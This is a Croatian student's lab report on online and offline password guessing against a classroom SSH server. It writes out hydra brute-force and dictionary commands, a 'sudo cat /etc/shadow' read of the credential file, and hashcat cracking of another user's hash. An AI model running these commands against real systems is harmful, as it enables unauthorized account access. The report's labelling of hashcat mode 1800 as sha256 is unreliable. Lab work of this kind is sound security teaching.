# 5.laboratorijska vjezba

Naslov vježbe:

## **Online and Offline Password Guessing Attacks**

Na današnjoj vježbi ćemo probati online i offline password guessing napad. 

### ONLINE PASSWORD GUESSING:

Otvaramo Windows Terminal, gdje ćemo i raditi cijelu vježbu.

Pingamo a507 server local da provjerimo jesmo li na istom LAN-u, jer nam je nužan uvjet da uspješno komuniciramo sa serverom. To smo učinili na način:

```python
ping a507-server.local
```

Otvaramo local server da vidimo svoj username i IP address.

Username: maric_karlo

IP address: 10.0.15.7

Spajanje na server ostvarujemo korištenjem ssh klijenta naredbom —>

```python
ssh maric_karlo@10.0.15.7
```

Pokušali smo unijeti password kojeg naravno ne znamo, ali nas sustav odbija i nema rate limita. 

Sustav je podložan online napadu i to ćemo sada i napraviti, za što nam je potreban alat **hydra** koji je prethodno instaliran na uređaju**.**

Hintovi za password su:

- password je sastavljen od malih slova (lowercase) engleske abecede
- password ima između 4 i 6 znakova

Napad pomoću naredbe:

```python
hydra -l maric_karlo -x 4:6:a 10.0.15.7 -V -t 1 ssh
```

### Brojke:

Matematičkim izračunom smo našli da je password space jednak: 2^30.

Vrijeme koje nam treba za proći cijeli password space je: 2^24 minuta, a to je otprilike 2^5 godina, što je naravno ogromna količina vremena za pronaći jedan password.

Zato ćemo koristiti dictionary, te ćemo napraviti pre-computed dictionary attack. Preuzeli smo dictionary (za online i offline) koji nam je profesor pripremio: `wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g4/`,

te smo krenili pretrazivat sada to za online napad: `hydra -l maric_karlo -P dictionary/g1/dictionary_online.txt 10.0.15.7 -V -t 4 ssh`

Dictionary ima 860 passworda, pronasli smo svoj password isa tim passwordom i ulogiramo se na remote server pomoću ssg klijenta: 

```python
ssh maric_karlo@10.0.15.7

```

### OFFLINE PASSWORD GUESSING:

Nastavljamo tamo di smo stali, tj. na remote serveru. Nastavak je **offline password guessing** napad.

Koristimo hashcat, koji je vec instaliran na uređaju.

Da bi pristupili hashevima, pomoću sudo naredbe smo došli do foldera u kojima su pohranjeni: 

```python
sudo cat /etc/shadow
```

i unosimo password kojeg smo maloprije dobili.

Da vidimo ovi file, trebamo ga izvršiti kao administrator što mi to sada nismo.

Nakon ispisivanje liste korisnika, odabrali smo jednoga (ja sam odabrao **freddie_mercury**) i kopirali smo njegovu hash vrijednost, spremili je lokalno te smo probali **brute force** napadom koji nije bio uspješan.

Napad:

```python
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

Slično kao i kod online password guessing napada, imamo dva hinta koji su:

- password se sastoji od malih (lowercase) slova u engleskoj abecedi
- password ima 6 znakova

Izvršavamo drugi napad:

```python
hashcat --force -m 1800 -a 0 hash.txt dictionary/g4/dictionary_offline.txt --status --status-timer 10
```

Sada iz dictionarija (offline naravno) usporeduje hash vrijednost koju pretvara sa sha256 u normalnu vrijednost. 

U jednom trenutku kada je pronašao password (”theare”) ulogirali smo se: 

```python
ssh freddie_mercury@10.0.15.7
```

 sa novim passwordom i uspješno smo se ulogirali na server.